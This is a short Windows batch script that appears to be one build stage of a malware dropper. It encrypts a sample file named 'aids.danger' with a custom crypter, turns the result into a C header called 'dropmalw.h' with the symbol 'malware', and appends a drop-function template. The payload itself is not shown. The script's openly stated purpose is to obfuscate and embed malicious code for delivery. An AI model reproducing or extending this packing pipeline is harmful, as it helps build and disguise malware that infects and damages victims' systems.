call %~dp0\cleanup.bat && (echo Success) || (echo ***Error*** && goto exit)
call %~dp0\..\..\stub_tools\cryptbin.py -k 0 -x 0 -i %~dp0\aids.danger -o aids.crypted.bin && (echo Success) || (echo ***Error*** && goto exit)
call %~dp0\..\..\stub_tools\binhex.exe %~dp0\aids.crypted.bin %~dp0\dropmalw.h --name=malware && (echo Success) || (echo ***Error*** && goto exit)
type %~dp0\aids.CRYPTED.h >> %~dp0\dropmalw.h
type %~dp0\drop_malw_func.tmpl >> %~dp0\dropmalw.h

:exit
